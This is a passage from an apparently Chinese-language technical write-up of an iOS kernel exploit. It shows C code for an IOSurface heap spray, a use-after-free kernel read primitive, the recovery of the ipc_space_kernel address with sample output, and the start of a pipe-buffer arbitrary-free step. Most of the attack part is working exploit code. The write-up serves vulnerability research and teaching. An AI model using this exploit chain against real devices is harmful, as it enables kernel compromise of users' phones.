&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;IOSurface_spray_with_gc_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extra_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 初始化IOSurface，获取IOSurfaceRootUserClient用于函数调用&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 此处extra_count为0，每次堆喷的数组长度为256，数组元素就是我们构造的数据data&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 计算每一个数组元素data所需要的节点数量&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_per_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_for_data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_per_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// Allocate the args struct.&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurfaceValueArgs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
    &lt;span class=&quot;c1&quot;&gt;// Build the IOSurfaceValueArgs.&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;surface_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
    &lt;span class=&quot;c1&quot;&gt;// Create the serialized OSArray. We'll remember the locations we need to fill in with our&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// data as well as the slot we need to set our key.&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize_IOSurface_data_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
    &lt;span class=&quot;c1&quot;&gt;// Keep track of when we need to do GC.&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sprayed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_gc_step&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// If we've crossed the GC sleep boundary, &lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// sleep for a bit and schedule the next one.&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// Now build the array and its elements.&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base255_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_arrays&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;// Copy in the data to the appropriate slot.&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		
        &lt;span class=&quot;c1&quot;&gt;// Finally set the array in the surface.&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_set_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;sprayed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_gc_step&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// printf(&quot;\n&quot;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;total_arrays&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;堆喷的细节就分析到这里，所以在利用中，我们构造好堆喷数据和长度之后，就可以调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rk64_via_uaf()&lt;/code&gt;进行堆喷操作&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rk64_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_20_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们在上一步已经获取了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;的内核态地址，根据结构体偏移，我们可以获取到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPC_SPACE&lt;/code&gt;的内核地址&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] kernel read primitive failed!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[i] ipc_space_kernel: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取一下数据&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[i] our task port: 0xfffffff001c3cc38
[i] ipc_space_kernel: 0xfffffff000a22fc0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-任意释放pipe-buffer&quot;&gt;6. 任意释放Pipe Buffer&lt;/h2&gt;

&lt;p&gt;Pipe管道是一个可以用于跨进程通信的机制，它会在内核缓冲区开辟内存空间进行数据的读写，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds[1]&lt;/code&gt;用于写入数据，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds[0]&lt;/code&gt;用于读取数据&lt;/p&gt;

&lt;p&gt;比如现在读写下标在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;的位置，我们写入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000&lt;/code&gt;字节，那么下标就会移动到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000&lt;/code&gt;，当我们读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000&lt;/code&gt;字节的时候，下标就会往回移动到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;最后一句写&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节到缓冲区里是为了用于后面的堆喷操作可以用构造的数据填充这片缓冲区，可以直接读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节的数据&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// do write() to allocate the buffer on the kernel&lt;/span&gt;
